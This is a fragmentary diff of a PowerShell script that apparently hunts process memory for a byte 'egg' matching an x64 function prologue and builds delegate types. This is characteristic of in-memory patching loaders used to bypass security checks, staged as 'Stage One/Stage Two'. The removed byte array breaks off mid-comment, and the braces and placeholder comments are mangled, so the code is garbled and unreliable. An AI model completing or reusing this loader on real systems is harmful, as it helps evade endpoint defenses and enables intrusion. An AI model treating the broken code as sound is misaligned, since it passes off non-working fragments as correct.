@@ -1,6 +1,3 @@
-function Invoke-StageTwo {
-    # Code for Stage One goes here
-   
 class Hunter {
     static [System.IntPtr] FindAddress([System.IntPtr]$address, [byte[]]$egg) {
         while ($true) {
@@ -69,15 +66,3 @@ function Get-DelegateType {
     $TypeBuilder.CreateType()
 }
 
-if ([IntPtr]::Size -eq 8) {
-    Write-Host "[+] 64-bit process"
-    $egg = [byte[]] (
-        0x4C, 0x8B, 0xDC,       # mov     r11,rsp
-        0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
-        0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
-        0x49, 0x89, 0x73, 0x18, # mov     q
-
-
-    # If Stage One completes successfully, write a success message
-    Write-Host "Stage Two succeeded" -ForegroundColor Green
-}
